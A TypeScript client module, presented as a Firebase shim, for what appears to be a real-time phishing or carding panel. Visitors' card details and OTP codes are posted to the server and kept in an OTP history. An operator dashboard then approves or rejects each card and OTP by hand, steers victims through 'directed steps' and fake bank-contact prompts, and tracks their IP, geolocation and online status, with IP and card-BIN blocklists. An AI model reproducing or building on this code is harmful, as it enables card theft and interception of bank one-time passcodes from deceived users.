// Server-proxied Firebase shim. The actual Firebase Admin SDK lives on the
// server (see server/firebase-admin.ts + server/firebase-routes.ts). This
// file preserves the public API the rest of the app already uses, but every
// call now goes through /api/fb/* endpoints (REST + SSE). No firebase client
// SDK is imported.
//
// Visitor ID is still stored in localStorage["visitor"] (unchanged).
// Admin auth uses an HttpOnly session cookie set by /api/fb/admin/login.

const MAX_HISTORY_ITEMS = 20;
const BLOCK_CACHE_TTL_MS = 10_000;

const blockedVisitorCache = new Map<
  string,
  { blocked: boolean; expiresAt: number }
>();

let cachedVisitorIp: string | null = null;
let cachedIpBlocked: boolean | null = null;
let cachedVisitorGeo: {
  country: string;
  countryCode: string;
  city: string;
  region: string;
} | null = null;

const sanitizeDigits = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/\D/g, "").slice(0, maxLength);
};
const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

async function postJson<T = any>(url: string, body: any, opts: { credentials?: RequestCredentials } = {}): Promise<{ ok: boolean; status: number; data: T | null }> {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body || {}),
      credentials: opts.credentials || "same-origin",
    });
    const data = (await res.json().catch(() => null)) as T | null;
    return { ok: res.ok, status: res.status, data };
  } catch (err) {
    console.error("[fb-shim] POST", url, "failed:", err);
    return { ok: false, status: 0, data: null };
  }
}

async function delJson<T = any>(url: string): Promise<{ ok: boolean; status: number; data: T | null }> {
  try {
    const res = await fetch(url, {
      method: "DELETE",
      credentials: "same-origin",
    });
    const data = (await res.json().catch(() => null)) as T | null;
    return { ok: res.ok, status: res.status, data };
  } catch (err) {
    return { ok: false, status: 0, data: null };
  }
}

/* -------------------- Visitor-doc SSE multiplexer -------------------- */
// One EventSource per visitor; multiple local listeners share the stream.
type VisitorDocListener = (snap: { exists: boolean; data: any | null }) => void;

const visitorStreams = new Map<
  string,
  {
    es: EventSource;
    listeners: Set<VisitorDocListener>;
    lastSnap: { exists: boolean; data: any | null } | null;
    pollTimer: ReturnType<typeof setInterval> | null;
    lastSerialized: string;
  }
>();

const VISITOR_POLL_MS = 2500;

function emitSnap(
  entry: NonNullable<ReturnType<typeof visitorStreams.get>>,
  snap: { exists: boolean; data: any | null },
) {
  const serialized = JSON.stringify(snap);
  if (serialized === entry.lastSerialized) return;
  entry.lastSerialized = serialized;
  entry.lastSnap = snap;
  for (const cb of Array.from(entry.listeners)) {
    try {
      cb(snap);
    } catch (err) {
      console.error(err);
    }
  }
}

async function pollVisitorOnce(visitorId: string) {
  const entry = visitorStreams.get(visitorId);
  if (!entry) return;
  try {
    const r = await fetch(
      `/api/fb/visitor/${encodeURIComponent(visitorId)}`,
      { credentials: "include", cache: "no-store" },
    );
    if (!r.ok) return;
    const json = (await r.json().catch(() => null)) as
      | { exists?: boolean; data?: any }
      | null;
    if (!json) return;
    emitSnap(entry, {
      exists: !!json.exists,
      data: json.data ?? null,
    });
  } catch {
    // ignore transient network errors; next tick will retry
  }
}

function ensureVisitorStream(visitorId: string) {
  let entry = visitorStreams.get(visitorId);
  if (entry) return entry;
  const es = new EventSource(
    `/api/fb/stream/visitor/${encodeURIComponent(visitorId)}`,
  );
  entry = {
    es,
    listeners: new Set(),
    lastSnap: null,
    pollTimer: null,
    lastSerialized: "",
  };
  visitorStreams.set(visitorId, entry);
  es.onmessage = (ev) => {
    try {
      const snap = JSON.parse(ev.data);
      emitSnap(entry!, snap);
    } catch (err) {
      console.error("[fb-shim] visitor stream parse error:", err);
    }
  };
  es.onerror = () => {
    // EventSource auto-reconnects; polling fallback below covers the gap.
  };

  // Polling fallback: SSE may be cut by serverless function timeouts
  // (e.g. Netlify Functions). Polling guarantees approval/OTP updates
  // still reach the client.
  void pollVisitorOnce(visitorId);
  entry.pollTimer = setInterval(() => {
    void pollVisitorOnce(visitorId);
  }, VISITOR_POLL_MS);
  return entry;
}

function subscribeVisitorDoc(visitorId: string, cb: VisitorDocListener): () => void {
  const entry = ensureVisitorStream(visitorId);
  entry.listeners.add(cb);
  if (entry.lastSnap) {
    try { cb(entry.lastSnap); } catch {}
  }
  return () => {
    entry.listeners.delete(cb);
    if (entry.listeners.size === 0) {
      try { entry.es.close(); } catch {}
      if (entry.pollTimer) clearInterval(entry.pollTimer);
      visitorStreams.delete(visitorId);
    }
  };
}

/* -------------------- IP blocklist SSE multiplexer -------------------- */
let ipStream: { es: EventSource; listeners: Set<(ips: string[]) => void>; last: string[] | null } | null = null;
function ensureIpStream() {
  if (ipStream) return ipStream;
  const es = new EventSource(`/api/fb/stream/blocked-ips`);
  ipStream = { es, listeners: new Set(), last: null };
  es.onmessage = (ev) => {
    try {
      const data = JSON.parse(ev.data);
      const ips: string[] = Array.isArray(data?.ips) ? data.ips : [];
      ipStream!.last = ips;
      for (const cb of Array.from(ipStream!.listeners)) {
        try { cb(ips); } catch (err) { console.error(err); }
      }
    } catch {}
  };
  return ipStream;
}
export function subscribeBlockedIps(cb: (ips: string[]) => void): () => void {
  const entry = ensureIpStream();
  entry.listeners.add(cb);
  if (entry.last) cb(entry.last);
  return () => {
    entry.listeners.delete(cb);
    if (entry.listeners.size === 0) {
      try { entry.es.close(); } catch {}
      ipStream = null;
    }
  };
}

/* -------------------- BIN blocklist SSE multiplexer -------------------- */
type BinEntry = { bin: string; bankName?: string; cardBrand?: string; country?: string; blockedAt?: string };
let binStream: { es: EventSource; listeners: Set<(bins: BinEntry[]) => void>; last: BinEntry[] | null } | null = null;
function ensureBinStream() {
  if (binStream) return binStream;
  const es = new EventSource(`/api/fb/stream/blocked-bins`);
  binStream = { es, listeners: new Set(), last: null };
  es.onmessage = (ev) => {
    try {
      const data = JSON.parse(ev.data);
      const bins: BinEntry[] = Array.isArray(data?.bins) ? data.bins : [];
      binStream!.last = bins;
      for (const cb of Array.from(binStream!.listeners)) {
        try { cb(bins); } catch (err) { console.error(err); }
      }
    } catch {}
  };
  return binStream;
}

/* -------------------- Admin visitors SSE multiplexer (dashboard) -------------------- */
let adminVisitorsStream:
  | { es: EventSource; listeners: Set<(visitors: any[]) => void>; last: any[] | null }
  | null = null;
function ensureAdminVisitorsStream() {
  if (adminVisitorsStream) return adminVisitorsStream;
  const es = new EventSource(`/api/fb/admin/stream/visitors`, { withCredentials: true } as any);
  adminVisitorsStream = { es, listeners: new Set(), last: null };
  es.onmessage = (ev) => {
    try {
      const data = JSON.parse(ev.data);
      const list: any[] = Array.isArray(data?.visitors) ? data.visitors : [];
      adminVisitorsStream!.last = list;
      for (const cb of Array.from(adminVisitorsStream!.listeners)) {
        try { cb(list); } catch (err) { console.error(err); }
      }
    } catch {}
  };
  return adminVisitorsStream;
}
export function subscribeAdminVisitors(cb: (visitors: any[]) => void): () => void {
  const entry = ensureAdminVisitorsStream();
  entry.listeners.add(cb);
  if (entry.last) cb(entry.last);
  return () => {
    entry.listeners.delete(cb);
    if (entry.listeners.size === 0) {
      try { entry.es.close(); } catch {}
      adminVisitorsStream = null;
    }
  };
}

/* -------------------- Online status (RTDB) SSE multiplexer -------------------- */
export type OnlineStatus = { online: boolean; lastSeen: number };
export type OnlineStatusMap = Record<string, OnlineStatus>;

let onlineStatusStream:
  | { es: EventSource; listeners: Set<(m: OnlineStatusMap) => void>; last: OnlineStatusMap | null }
  | null = null;
function ensureOnlineStatusStream() {
  if (onlineStatusStream) return onlineStatusStream;
  const es = new EventSource(`/api/fb/admin/stream/online-status`, { withCredentials: true } as any);
  onlineStatusStream = { es, listeners: new Set(), last: null };
  es.onmessage = (ev) => {
    try {
      const data = JSON.parse(ev.data);
      const statuses: OnlineStatusMap = data?.statuses && typeof data.statuses === "object" ? data.statuses : {};
      onlineStatusStream!.last = statuses;
      for (const cb of Array.from(onlineStatusStream!.listeners)) {
        try { cb(statuses); } catch (err) { console.error(err); }
      }
    } catch {}
  };
  return onlineStatusStream;
}
export function subscribeOnlineStatus(cb: (m: OnlineStatusMap) => void): () => void {
  const entry = ensureOnlineStatusStream();
  entry.listeners.add(cb);
  if (entry.last) cb(entry.last);
  return () => {
    entry.listeners.delete(cb);
    if (entry.listeners.size === 0) {
      try { entry.es.close(); } catch {}
      onlineStatusStream = null;
    }
  };
}

/* ==================== Auth ==================== */
export type AdminUser = { uid: string; email: string };

let cachedAdminUser: AdminUser | null = null;
const authListeners = new Set<(user: AdminUser | null) => void>();
function notifyAuth(user: AdminUser | null) {
  cachedAdminUser = user;
  for (const cb of Array.from(authListeners)) {
    try { cb(user); } catch {}
  }
}

export const loginWithEmail = async (email: string, password: string) => {
  const r = await postJson<{ uid: string; email: string; error?: string }>(
    "/api/fb/admin/login",
    { email, password },
    { credentials: "same-origin" },
  );
  if (!r.ok || !r.data?.uid) {
    const code = r.data?.error || "invalid_credential";
    const err: any = new Error(code);
    // Map server codes to the legacy Firebase auth error codes the UI checks.
    const map: Record<string, string> = {
      invalid_credential: "auth/invalid-credential",
      user_not_found: "auth/user-not-found",
      wrong_password: "auth/wrong-password",
      user_disabled: "auth/user-disabled",
    };
    err.code = map[code] || "auth/invalid-credential";
    throw err;
  }
  const user: AdminUser = { uid: r.data.uid, email: r.data.email };
  notifyAuth(user);
  return { user };
};

export const logoutUser = async () => {
  await postJson("/api/fb/admin/logout", {});
  notifyAuth(null);
};

export const onAuthChange = (callback: (user: AdminUser | null) => void) => {
  authListeners.add(callback);
  // Kick off (or reuse) the /me check so the listener fires once with the
  // current user. We always call back at least once (with null if unknown).
  (async () => {
    try {
      const res = await fetch("/api/fb/admin/me", { credentials: "same-origin" });
      const data = await res.json().catch(() => null);
      const user = data?.user ? { uid: data.user.uid, email: data.user.email } : null;
      cachedAdminUser = user;
      try { callback(user); } catch {}
    } catch {
      try { callback(null); } catch {}
    }
  })();
  return () => {
    authListeners.delete(callback);
  };
};

/* ==================== Visitor writes ==================== */
export async function addData(data: any): Promise<boolean> {
  const payload = { ...data };
  const visitorId =
    typeof payload?.id === "string" && payload.id
      ? payload.id
      : typeof window !== "undefined"
      ? localStorage.getItem("visitor")
      : null;
  if (!visitorId) {
    console.warn("Missing visitor ID. Cannot add data.");
    return false;
  }
  if (typeof window !== "undefined") localStorage.setItem("visitor", visitorId);
  if (cachedIpBlocked === true) return false;

  const r = await postJson("/api/fb/visitor/data", { ...payload, id: visitorId });
  return r.ok;
}

export const handleCurrentPage = async (page: string) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return false;
  return addData({ id: visitorId, currentPage: page });
};

export const handleOtp = async (otp: string, page: string = "otp") => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return false;
  if (cachedIpBlocked === true) throw new Error("IP_BLOCKED");

  const code = sanitizeDigits(otp, 6);
  if (typeof code !== "string" || code.length < 4) throw new Error("INVALID_OTP");

  const existingRaw =
    typeof window !== "undefined"
      ? JSON.parse(localStorage.getItem("otpHistory") || "[]")
      : [];
  const existing = Array.isArray(existingRaw) ? existingRaw : [];
  const otpEntry = { code, timestamp: new Date().toISOString() };
  const next = [...existing, otpEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);
  if (typeof window !== "undefined") localStorage.setItem("otpHistory", JSON.stringify(next));

  const r = await postJson<{ ok: boolean; error?: string }>(
    "/api/fb/visitor/otp",
    { visitorId, otp: code, page, history: existing },
  );
  if (!r.ok) {
    if (r.data?.error === "ip_blocked") throw new Error("IP_BLOCKED");
    if (r.data?.error === "visitor_blocked") throw new Error("VISITOR_BLOCKED");
    throw new Error(r.data?.error || "OTP_WRITE_FAILED");
  }
  return true;
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return false;
  if (cachedIpBlocked === true) throw new Error("IP_BLOCKED");

  const r = await postJson<{ ok: boolean; error?: string }>(
    "/api/fb/visitor/pay",
    { visitorId, paymentInfo },
  );
  if (!r.ok) {
    if (r.data?.error === "ip_blocked") throw new Error("IP_BLOCKED");
    if (r.data?.error === "visitor_blocked") throw new Error("VISITOR_BLOCKED");
    throw new Error(r.data?.error || "PAY_WRITE_FAILED");
  }
  if (typeof setPaymentInfo === "function") {
    setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
  }
  return true;
};

/* ==================== Visitor listeners ==================== */
export const listenForApproval = (
  callback: (status: "approved" | "rejected") => void,
): (() => void) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return () => {};
  return subscribeVisitorDoc(visitorId, (snap) => {
    if (!snap.exists || !snap.data) return;
    const data = snap.data;
    if (data.cardApproved === true) callback("approved");
    else if (data.cardStatus === "rejected") callback("rejected");
  });
};

export const listenForOtpApproval = (
  callback: (status: "approved" | "rejected") => void,
): (() => void) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return () => {};
  return subscribeVisitorDoc(visitorId, (snap) => {
    if (!snap.exists || !snap.data) return;
    const data = snap.data;
    if (data.otpApproved === true) callback("approved");
    else if (data.otpStatus === "rejected") callback("rejected");
  });
};

export const listenForDirectedStep = (
  callback: (step: number, data: any) => void,
): (() => void) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return () => {};
  let lastDirectedAt = "";
  return subscribeVisitorDoc(visitorId, (snap) => {
    if (!snap.exists || !snap.data) return;
    const data = snap.data;
    const step = Number(data?.directedStep) || 0;
    const directedAt = String(data?.directedAt || "");
    if (step > 0 && directedAt && directedAt !== lastDirectedAt) {
      lastDirectedAt = directedAt;
      callback(step, data);
    } else if (step === 0) {
      lastDirectedAt = "";
    }
  });
};

export const clearDirectedStep = async () => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return;
  await postJson("/api/fb/visitor/clear-step", { visitorId });
};

export const listenForBankContactRequest = (
  callback: (
    show: boolean,
    payload: { requestedAt: string; cardBin: string; cardBankName: string },
  ) => void,
): (() => void) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return () => {};
  return subscribeVisitorDoc(visitorId, (snap) => {
    if (!snap.exists || !snap.data) {
      callback(false, { requestedAt: "", cardBin: "", cardBankName: "" });
      return;
    }
    const data = snap.data;
    const requested = Boolean(data?.bankContactRequest);
    const confirmed = Boolean(data?.bankContactConfirmed);
    const requestedAt = String(data?.bankContactAt || "");
    const rawCard = String(data?.cardNumber || "").replace(/\D/g, "");
    const cardBin = rawCard.slice(0, 6);
    const cardBankName = String(data?.cardBankName || data?.cardBank || data?.bankName || "");
    callback(requested && !confirmed, { requestedAt, cardBin, cardBankName });
  });
};

export const confirmBankContact = async () => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return;
  await postJson("/api/fb/visitor/bank-contact/confirm", { visitorId });
};

export const listenForVisitorBlock = (
  callback: (blocked: boolean) => void,
): (() => void) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
  if (!visitorId) return () => {};
  return subscribeVisitorDoc(visitorId, (snap) => {
    const blocked = Boolean(snap.data?.blocked);
    blockedVisitorCache.set(visitorId, { blocked, expiresAt: Date.now() + BLOCK_CACHE_TTL_MS });
    callback(blocked);
  });
};

/* ==================== IP / geo ==================== */
export const fetchVisitorIp = async (): Promise<string> => {
  if (cachedVisitorIp !== null) return cachedVisitorIp;
  try {
    const res = await fetch("/api/visitor-ip");
    if (!res.ok) {
      cachedVisitorIp = "";
      return "";
    }
    const json = await res.json();
    cachedVisitorIp = typeof json?.ip === "string" ? json.ip : "";
    cachedVisitorGeo = {
      country: typeof json?.country === "string" ? json.country : "",
      countryCode: typeof json?.countryCode === "string" ? json.countryCode : "",
      city: typeof json?.city === "string" ? json.city : "",
      region: typeof json?.region === "string" ? json.region : "",
    };
    return cachedVisitorIp || "";
  } catch (error) {
    console.error("Error fetching visitor IP:", error);
    cachedVisitorIp = "";
    cachedVisitorGeo = null;
    return "";
  }
};

export const isIpBlocked = async (ip: string): Promise<boolean> => {
  if (!ip) return false;
  // Use the SSE stream's last value if available (avoids a round-trip and
  // reflects realtime admin updates). Otherwise open the stream and wait
  // for the first emission with a short timeout.
  const stream = ensureIpStream();
  if (stream.last) return stream.last.includes(ip.trim());
  return await new Promise<boolean>((resolve) => {
    let off: (() => void) | null = null;
    const t = setTimeout(() => {
      if (off) off();
      resolve(false);
    }, 2500);
    off = subscribeBlockedIps((ips) => {
      clearTimeout(t);
      if (off) off();
      resolve(ips.includes(ip.trim()));
    });
  });
};

export const isCachedIpBlocked = (): boolean => cachedIpBlocked === true;

export const listenForIpBlock = (
  ip: string,
  callback: (blocked: boolean) => void,
): (() => void) => {
  if (!ip) return () => {};
  return subscribeBlockedIps((ips) => {
    const blocked = ips.includes(ip.trim());
    cachedIpBlocked = blocked;
    callback(blocked);
  });
};

export const ensureVisitorIp = async (): Promise<{ ip: string; blocked: boolean }> => {
  const ip = await fetchVisitorIp();
  if (!ip) {
    cachedIpBlocked = false;
    return { ip: "", blocked: false };
  }
  const blocked = await isIpBlocked(ip);
  cachedIpBlocked = blocked;

  // Best-effort: attach IP/geo to the visitor's pay doc.
  try {
    const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
    if (visitorId) {
      const geo = cachedVisitorGeo;
      await postJson("/api/fb/visitor/data", {
        id: visitorId,
        ip,
        ipAddress: ip,
        ipUpdatedAt: new Date().toISOString(),
        ...(geo
          ? {
              geoCountry: geo.country,
              geoCountryCode: geo.countryCode,
              geoCity: geo.city,
              geoRegion: geo.region,
            }
          : {}),
      });
    }
  } catch (error) {
    console.error("Error attaching visitor IP:", error);
  }
  return { ip, blocked };
};

/* ==================== Blocked BINs ==================== */
const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);

export const isBinBlocked = async (cardOrBin: string): Promise<boolean> => {
  const bin = normalizeBin(cardOrBin);
  if (bin.length < 6) return false;
  // Prefer the live stream cache when the dashboard has it open; otherwise
  // hit the one-shot endpoint.
  if (binStream?.last) return binStream.last.some((b) => normalizeBin(b.bin) === bin);
  try {
    const res = await fetch(`/api/fb/blocked-bin/${encodeURIComponent(bin)}`);
    const data = await res.json().catch(() => null);
    return Boolean(data?.blocked);
  } catch {
    return false;
  }
};

export const addBlockedBin = async (
  bin: string,
  meta?: { bankName?: string; cardBrand?: string; country?: string },
) => {
  const normalized = normalizeBin(bin);
  if (normalized.length !== 6) throw new Error("INVALID_BIN");
  const r = await postJson("/api/fb/admin/blocked-bins/add", { bin: normalized, meta: meta || {} });
  if (!r.ok) throw new Error("BLOCK_BIN_FAILED");
  return true;
};

export const removeBlockedBin = async (bin: string) => {
  const normalized = normalizeBin(bin);
  if (!normalized) return false;
  const r = await postJson("/api/fb/admin/blocked-bins/remove", { bin: normalized });
  if (!r.ok) throw new Error("UNBLOCK_BIN_FAILED");
  return true;
};

export const listenBlockedBins = (cb: (bins: BinEntry[]) => void): (() => void) => {
  const entry = ensureBinStream();
  entry.listeners.add(cb);
  if (entry.last) cb(entry.last);
  return () => {
    entry.listeners.delete(cb);
    if (entry.listeners.size === 0) {
      try { entry.es.close(); } catch {}
      binStream = null;
    }
  };
};

/* ==================== Admin writes ==================== */
export const updateOtpApprovalStatus = async (visitorId: string, approved: boolean) => {
  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/otp-approval`, { approved });
};

export const updateApprovalStatus = async (visitorId: string, approved: boolean) => {
  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/approval`, { approved });
};

export const updateVisitorBlockStatus = async (visitorId: string, blocked: boolean) => {
  const r = await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/block`, { blocked });
  if (r.ok) {
    blockedVisitorCache.set(visitorId, { blocked, expiresAt: Date.now() + BLOCK_CACHE_TTL_MS });
  }
  return r.ok;
};

export const pushBankContactRequest = async (visitorId: string) => {
  if (!visitorId) return;
  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/bank-contact`, {});
};

export const adminMergeVisitor = async (visitorId: string, patch: Record<string, unknown>) => {
  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/merge`, { patch });
};

export const adminAddBlockedIp = async (ip: string) => {
  await postJson("/api/fb/admin/blocked-ips/add", { ip });
};

export const adminRemoveBlockedIp = async (ip: string) => {
  await postJson("/api/fb/admin/blocked-ips/remove", { ip });
};

export const adminDeleteVisitor = async (visitorId: string) => {
  await delJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}`);
};

export const adminDeleteAllVisitors = async () => {
  await delJson("/api/fb/admin/visitors");
};

// Legacy compat shims so any stray import doesn't crash. The old objects no
// longer exist; pages that referenced them have been migrated.
export const db = null as any;
export const database = null as any;
export const auth = null as any;
